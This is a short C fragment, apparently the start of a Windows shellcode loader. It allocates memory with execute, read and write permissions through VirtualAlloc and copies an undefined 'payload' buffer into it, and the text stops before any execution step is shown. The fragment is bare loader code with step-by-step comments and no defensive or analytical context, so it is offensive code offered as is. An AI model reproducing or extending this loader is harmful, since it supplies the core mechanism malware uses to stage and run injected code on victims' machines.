int main(void)
{
    LPVOID exec_mem = NULL;
    HANDLE hThread = NULL;
    DWORD oldProtect = 0;

    // 1. Allocate executable memory (RWX).
    exec_mem = VirtualAlloc(
        NULL,
        sizeof(payload),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (exec_mem == NULL) {
        fprintf(stderr, "VirtualAlloc failed: %lu\n", GetLastError());
        return 1;
    }

    // 2. Copy the payload into the executable buffer.
    RtlMoveMemory(exec_mem, payload, sizeof(payload));

